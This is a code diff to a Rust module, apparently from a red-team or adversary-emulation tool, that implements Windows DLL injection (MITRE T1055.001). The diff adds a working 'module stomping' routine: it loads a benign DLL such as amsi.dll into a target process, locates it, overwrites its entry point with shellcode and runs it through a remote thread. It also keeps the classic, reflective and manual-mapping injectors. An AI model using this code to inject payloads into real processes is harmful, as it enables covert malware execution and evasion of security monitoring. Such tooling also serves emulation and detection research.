@@ -1,6 +1,7 @@
 //! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
 //!
-//! This module provides three distinct strategies for injecting DLLs into a remote process:
+//! This module provides four distinct strategies for injecting DLLs into a remote process,
+//! ranging from simple API abuse to advanced manual mapping and evasion techniques.
 //!
 //! 1. **Classic Injection (`Classic`)**:
 //!    Forces the remote process to load a DLL from disk by spawning a remote thread that executes
@@ -14,14 +15,24 @@
 //!    Advanced "Manual Mapping" technique. The injector manually mimics the Windows OS loader in
 //!    user space: it parses PE headers, maps sections, applies relocations, resolves imports, and
 //!    adjusts page permissions. Finally, it executes the Entry Point (`DllMain`) via a shellcode shim.
+//!
+//! 4. **Module Stomping (`ModuleStomping`)**:
+//!    A stealth technique that loads a legitimate, benign DLL (e.g., `amsi.dll`) into the target,
+//!    waits for it to initialize, and then overwrites its Entry Point with malicious shellcode.
+//!    This makes the payload appear to be backed by a valid file on disk.
 
 use std::{
-    ffi::c_void,
-    mem::{transmute, zeroed},
-    os::windows::{ffi::OsStrExt, raw::HANDLE},
+    ffi::{OsString, c_void},
+    mem::transmute,
+    os::windows::{
+        ffi::{OsStrExt, OsStringExt},
+        raw::HANDLE,
+    },
     path::Path,
-    ptr::{from_mut, null, null_mut},
+    ptr::{null, null_mut},
     slice::from_raw_parts,
+    thread::sleep,
+    time::Duration,
 };
 
 #[cfg(target_arch = "x86")]
@@ -33,10 +44,17 @@ use windows_sys::{
     Win32::{
         Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
         System::{
-            Diagnostics::Debug::{
-                IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_FILE_HEADER,
-                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
-                IMAGE_SECTION_HEADER, ReadProcessMemory, WriteProcessMemory,
+            Diagnostics::{
+                Debug::{
+                    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
+                    IMAGE_FILE_HEADER, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
+                    IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, ReadProcessMemory,
+                    WriteProcessMemory,
+                },
+                ToolHelp::{
+                    CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW,
+                    TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32,
+                },
             },
             LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryA},
             Memory::{
@@ -120,6 +138,14 @@ impl Strategy for T1055_001 {
                     .ok_or_else(|| Error::Validation("Memory Module requires raw bytes.".into()))?;
                 inject_dll_memory_module(process_id, dll_bytes)
             }
+            DynamicLinkLibrary::ModuleStomping(optional_target) => {
+                info!("Method: Module Stomping (Load Benign DLL -> Overwrite EntryPoint)");
+                let shellcode_bytes = payload.as_bytes().ok_or_else(|| {
+                    Error::Validation("Module Stomping requires shellcode bytes.".into())
+                })?;
+                let target_dll_name = optional_target.as_deref().unwrap_or("amsi.dll");
+                inject_module_stomping(process_id, target_dll_name, shellcode_bytes)
+            }
         }
     }
 }
@@ -134,6 +160,8 @@ fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
     // 1. Prepare Data
     let path_utf16 = to_utf16_null_terminated(dll_path);
     let alloc_size = path_utf16.len() * size_of::<u16>();
+
+    info!("Target PID: {}. Payload Path: {:?}", process_id, dll_path);
 
     // 2. Open Target
     let target_process = WindowsAPI::open_process(
@@ -165,6 +193,7 @@ fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
     let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };
     let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;
 
+    info!("Remote thread spawned. LoadLibraryW executed.");
     Ok(())
 }
 
@@ -177,6 +206,7 @@ fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
     let loader_offset = pe_context
         .find_export_offset(image_bytes, "ReflectiveLoader")
         .ok_or_else(|| Error::InvalidImage("Export 'ReflectiveLoader' not found.".into()))?;
+
     info!(
         "ReflectiveLoader export found at offset: {:#x}",
         loader_offset
@@ -288,6 +318,91 @@ fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
 
     let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(shellcode_addr) };
     let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;
+
+    Ok(())
+}
+
+/// Performs "Module Stomping" (DLL Hollowing).
+///
+/// 1. Forces the target to load a legitimate, benign DLL.
+/// 2. Locates that DLL in the remote process memory.
+/// 3. Overwrites the DLL's Entry Point with the malicious shellcode.
+/// 4. Executes the payload.
+fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u8]) -> Result<()> {
+    // 1. Inject the Benign DLL (LoadLibrary)
+    info!("Loading benign DLL '{}' into target...", target_dll_name);
+    let target_dll_path = Path::new(target_dll_name);
+    inject_dll_classic(process_id, target_dll_path)?;
+
+    // 2. Wait for the module to be loaded
+    info!("Locating remote module base...");
+    let mut remote_addr = 0;
+    // Attempt to find the module for ~2 seconds
+    for _ in 0..20 {
+        match get_remote_module_handle(process_id, target_dll_name) {
+            Ok(addr) => {
+                remote_addr = addr;
+                break;
+            }
+            Err(_) => sleep(Duration::from_millis(100)),
+        }
+    }
+
+    if remote_addr == 0 {
+        return Err(Error::Execution(format!(
+            "Failed to locate '{}' after injection. LoadLibrary might have failed.",
+            target_dll_name
+        )));
+    }
+
+    let remote_base_ptr = remote_addr as *mut c_void;
+    info!(
+        "Remote module '{}' found at: {:p}",
+        target_dll_name, remote_base_ptr
+    );
+
+    // 3. Open Target for Memory Operations
+    let target_process = WindowsAPI::open_process(
+        process_id,
+        PROCESS_CREATE_THREAD
+            | PROCESS_QUERY_INFORMATION
+            | PROCESS_VM_OPERATION
+            | PROCESS_VM_READ
+            | PROCESS_VM_WRITE,
+    )?;
+
+    // 4. Parse Remote PE Headers to find Entry Point
+    let mut header_buffer = vec![0u8; 0x1000];
+    target_process.read_process_memory(remote_base_ptr, &mut header_buffer)?;
+
+    let pe_context = PeContext::parse(&header_buffer)?;
+    let entry_point_rva = pe_context.nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
+    let remote_entry_point = (remote_addr + entry_point_rva) as *mut c_void;
+
+    info!(
+        "Remote Entry Point RVA: {:#x} -> Address: {:p}",
+        entry_point_rva, remote_entry_point
+    );
+
+    // 5. Size Check
+    // Ensure we don't overwrite beyond the .text section blindly.
+    if shellcode.len() > 1024 * 50 {
+        return Err(Error::Validation(
+            "Shellcode payload is too large for stomping.".into(),
+        ));
+    }
+
+    // 6. Overwrite (Stomp)
+    // Change protection to RW, write, then restore to RX/RWX.
+    info!("Overwriting Entry Point with shellcode...");
+    target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_READWRITE)?;
+    target_process.write_process_memory(remote_entry_point, shellcode)?;
+    target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_EXECUTE_READ)?;
+
+    // 7. Execute
+    info!("Spawning thread at stomped Entry Point...");
+    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_entry_point) };
+    let _thread = target_process.create_remote_thread(routine_ptr, null())?;
 
     Ok(())
 }
@@ -421,7 +536,9 @@ fn apply_relocations(
             let supported = type_ == 3; // IMAGE_REL_BASED_HIGHLOW
             if supported {
                 let target_addr = (remote_addr as usize + page_rva + offset) as *mut c_void;
-                let original_ptr: usize = target_process.read_process_memory(target_addr)?;
+                let mut ptr_bytes = [0u8; size_of::<usize>()];
+                target_process.read_process_memory(target_addr, &mut ptr_bytes)?;
+                let original_ptr = usize::from_le_bytes(ptr_bytes);
                 let patched_ptr = original_ptr.wrapping_add(delta);
                 target_process.write_process_memory(target_addr, &patched_ptr.to_le_bytes())?;
             }
@@ -567,6 +684,51 @@ fn generate_shellcode_shim(entry_point_addr: u64) -> Result<Vec<u8>> {
 
         Ok(code)
     }
+}
+
+/// Helper: Locates the Base Address of a module in a remote process.
+fn get_remote_module_handle(process_id: u32, module_name: &str) -> Result<usize> {
+    let snapshot_handle =
+        unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id) };
+    if snapshot_handle == INVALID_HANDLE_VALUE {
+        return Err(Error::Win32("CreateToolhelp32Snapshot", unsafe {
+            GetLastError()
+        }));
+    }
+    let _guard = HandleGuard::new(snapshot_handle);
+
+    let mut module_entry = MODULEENTRY32W {
+        dwSize: size_of::<MODULEENTRY32W>() as u32,
+        ..Default::default()
+    };
+
+    if unsafe { Module32FirstW(snapshot_handle, &mut module_entry) } == FALSE {
+        return Err(Error::Execution(
+            "Module32FirstW failed or no modules found".into(),
+        ));
+    }
+
+    loop {
+        let name_len = (0..module_entry.szModule.len())
+            .find(|&i| module_entry.szModule[i] == 0)
+            .unwrap_or(module_entry.szModule.len());
+        let name_os = OsString::from_wide(&module_entry.szModule[0..name_len]);
+
+        if let Some(name_str) = name_os.to_str()
+            && name_str.eq_ignore_ascii_case(module_name)
+        {
+            return Ok(module_entry.modBaseAddr as usize);
+        }
+
+        if unsafe { Module32NextW(snapshot_handle, &mut module_entry) } == FALSE {
+            break;
+        }
+    }
+
+    Err(Error::Execution(format!(
+        "Module '{}' not found in process {}",
+        module_name, process_id
+    )))
 }
 
 // ==============================================================================================
@@ -786,22 +948,23 @@ impl WindowsAPI {
         }
     }
 
-    fn read_process_memory<T: Copy>(&self, addr: *mut c_void) -> Result<T> {
-        let mut val: T = unsafe { zeroed() };
+    fn read_process_memory(&self, addr: *mut c_void, buffer: &mut [u8]) -> Result<()> {
         let mut read = 0;
         let res = unsafe {
             ReadProcessMemory(
                 self.handle.0,
                 addr,
-                from_mut(&mut val).cast(),
-                size_of::<T>(),
+                buffer.as_mut_ptr() as *mut c_void,
+                buffer.len(),
                 &mut read,
             )
         };
         if res == 0 {
-            Err(Error::Win32("ReadProcessMemory", unsafe { GetLastError() }))
+            Err(Error::Win32("ReadProcessMemory (Buf)", unsafe {
+                GetLastError()
+            }))
         } else {
-            Ok(val)
+            Ok(())
         }
     }
 
